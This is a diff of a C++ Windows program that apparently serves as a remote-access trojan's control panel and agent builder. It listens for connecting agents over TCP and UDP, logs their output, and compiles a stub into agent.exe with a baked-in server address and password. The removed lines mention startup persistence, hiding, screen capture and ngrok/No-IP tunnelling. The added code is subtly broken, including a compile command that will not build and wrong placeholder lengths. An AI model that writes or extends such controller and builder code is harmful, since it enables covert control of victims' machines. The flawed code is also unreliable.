@@ -1,23 +1,23 @@
 #include <iostream>
+#include <fstream>
+#include <string>
+#include <sstream>
 #include <thread>
-#include <vector>
 #include <map>
 #include <mutex>
 #include <winsock2.h>
 #include <windows.h>
 #include <commctrl.h>
-#include <string>
-#include <fstream>
-#include <chrono>
-#include <gdiplus.h>
+#include <shellapi.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Comctl32.lib")
-#pragma comment(lib, "gdiplus.lib")
 
 #define TCP_PORT 9999
 #define UDP_PORT 8888
-#define BUILDER_FILE "agent_builder.exe"
+#define STUB_FILE "stub.cpp"
+#define TEMP_AGENT_FILE "temp_agent.cpp"
+#define AGENT_EXE "agent.exe"
 
 std::map<std::string, SOCKET> clients;
 std::mutex clientsMutex;
@@ -35,10 +35,7 @@ void handleTCPClient(SOCKET clientSocket);
 void handleUDPClient(SOCKET clientSocket);
 void startTCPServer(std::string ip, int port);
 void startUDPServer(std::string ip, int port);
-void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup, const std::string& hideIn, const std::string& mutex, const std::string& ngrokToken, const std::string& noipUsername, const std::string& noipPassword, const std::string& noipHostname);
-void captureScreen(SOCKET clientSocket);
-void startNgrok(const std::string& token);
-void startNoIP(const std::string& username, const std::string& password, const std::string& hostname);
+void buildAgent(const std::string& ip, int port, const std::string& password);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     WNDCLASS wc = {};
@@ -148,20 +145,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 GetWindowTextA(agentPortInput, agentPort, sizeof(agentPort));
                 char password[64];
                 GetWindowTextA(passwordInput, password, sizeof(password));
-                bool startOnStartup = SendMessage(startOnStartupCheckbox, BM_GETCHECK, 0, 0) == BST_CHECKED;
-                char hideIn[64];
-                GetWindowTextA(hideInComboBox, hideIn, sizeof(hideIn));
-                char mutex[64];
-                GetWindowTextA(mutexInput, mutex, sizeof(mutex));
-                char ngrokToken[64];
-                GetWindowTextA(ngrokTokenInput, ngrokToken, sizeof(ngrokToken));
-                char noipUsername[64];
-                GetWindowTextA(noipUsernameInput, noipUsername, sizeof(noipUsername));
-                char noipPassword[64];
-                GetWindowTextA(noipPasswordInput, noipPassword, sizeof(noipPassword));
-                char noipHostname[64];
-                GetWindowTextA(noipHostnameInput, noipHostname, sizeof(noipHostname));
-                std::thread(buildAgent, std::string(agentIp), atoi(agentPort), std::string(password), startOnStartup, std::string(hideIn), std::string(mutex), std::string(ngrokToken), std::string(noipUsername), std::string(noipPassword), std::string(noipHostname)).detach();
+                buildAgent(agentIp, atoi(agentPort), password);
             }
             break;
         }
@@ -183,41 +167,127 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 }
 
 void logMessage(const std::string& message, COLORREF color) {
-    // Add code to log messages to terminalOutput
+    CHARRANGE cr;
+    cr.cpMin = -1;
+    cr.cpMax = -1;
+    SendMessage(terminalOutput, EM_EXSETSEL, 0, (LPARAM)&cr);
+    CHARFORMAT cf;
+    cf.cbSize = sizeof(cf);
+    cf.dwMask = CFM_COLOR;
+    cf.crTextColor = color;
+    cf.dwEffects = 0;
+    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
+    SendMessage(terminalOutput, EM_REPLACESEL, FALSE, (LPARAM)message.c_str());
 }
 
 void updateClientList() {
-    // Add code to update the client list
+    SendMessage(clientList, LB_RESETCONTENT, 0, 0);
+    clientsMutex.lock();
+    for (const auto& client : clients) {
+        SendMessage(clientList, LB_ADDSTRING, 0, (LPARAM)client.first.c_str());
+    }
+    clientsMutex.unlock();
 }
 
 void handleTCPClient(SOCKET clientSocket) {
-    // Add code to handle TCP client communications
+    char buffer[512];
+    int result;
+    while ((result = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
+        buffer[result] = '\0';
+        logMessage(buffer, RGB(0, 255, 0));
+    }
+    closesocket(clientSocket);
 }
 
 void handleUDPClient(SOCKET clientSocket) {
-    // Add code to handle UDP client communications
+    char buffer[512];
+    sockaddr_in clientAddr;
+    int clientAddrLen = sizeof(clientAddr);
+    int result;
+    while ((result = recvfrom(clientSocket, buffer, sizeof(buffer), 0, (sockaddr*)&clientAddr, &clientAddrLen)) > 0) {
+        buffer[result] = '\0';
+        logMessage(buffer, RGB(0, 255, 0));
+    }
 }
 
 void startTCPServer(std::string ip, int port) {
-    // Add code to start the TCP server
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
+    serverAddr.sin_port = htons(port);
+    bind(tcpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
+    listen(tcpServerSocket, SOMAXCONN);
+    logMessage("TCP Server started\n", RGB(0, 255, 0));
+
+    while (tcpServerSocket != INVALID_SOCKET) {
+        SOCKET clientSocket = accept(tcpServerSocket, NULL, NULL);
+        clientsMutex.lock();
+        clients[inet_ntoa(serverAddr.sin_addr)] = clientSocket;
+        clientsMutex.unlock();
+        updateClientList();
+        std::thread(handleTCPClient, clientSocket).detach();
+    }
 }
 
 void startUDPServer(std::string ip, int port) {
-    // Add code to start the UDP server
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    udpServerSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
+    serverAddr.sin_port = htons(port);
+    bind(udpServerSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
+    logMessage("UDP Server started\n", RGB(0, 255, 0));
+
+    std::thread(handleUDPClient, udpServerSocket).detach();
 }
 
-void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup, const std::string& hideIn, const std::string& mutex, const std::string& ngrokToken, const std::string& noipUsername, const std::string& noipPassword, const std::string& noipHostname) {
-    // Add code to build the agent executable with specified parameters
-}
+void buildAgent(const std::string& ip, int port, const std::string& password) {
+    std::ifstream stubFile(STUB_FILE);
+    std::stringstream buffer;
+    buffer << stubFile.rdbuf();
+    stubFile.close();
 
-void captureScreen(SOCKET clientSocket) {
-    // Add code to capture the screen and send it to the server
-}
+    std::string agentCode = buffer.str();
+    size_t pos;
 
-void startNgrok(const std::string& token) {
-    // Add code to start ngrok with the given auth token
-}
+    pos = agentCode.find("%%SERVER_IP%%");
+    if (pos != std::string::npos) {
+        agentCode.replace(pos, 13, ip);
+    }
 
-void startNoIP(const std::string& username, const std::string& password, const std::string& hostname) {
-    // Add code to start No-IP with the given credentials and hostname
+    pos = agentCode.find("%%SERVER_PORT%%");
+    if (pos != std::string::npos) {
+        agentCode.replace(pos, 14, std::to_string(port));
+    }
+
+    pos = agentCode.find("%%PASSWORD%%");
+    if (pos != std::string::npos) {
+        agentCode.replace(pos, 11, password);
+    }
+
+    // Write modified agent code to a temporary file
+    std::ofstream tempAgentFile(TEMP_AGENT_FILE);
+    tempAgentFile << agentCode;
+    tempAgentFile.close();
+
+    // Compile the temporary agent file
+    std::string compileCommand = "g++ " + TEMP_AGENT_FILE + " -o " + AGENT_EXE;
+    int compileResult = system(compileCommand.c_str());
+
+    // Check if compilation was successful
+    if (compileResult == 0) {
+        logMessage("Agent built successfully\n", RGB(0, 255, 0));
+    } else {
+        logMessage("Failed to build agent\n", RGB(255, 0, 0));
+    }
+
+    // Remove the temporary agent file
+    remove(TEMP_AGENT_FILE);
 }
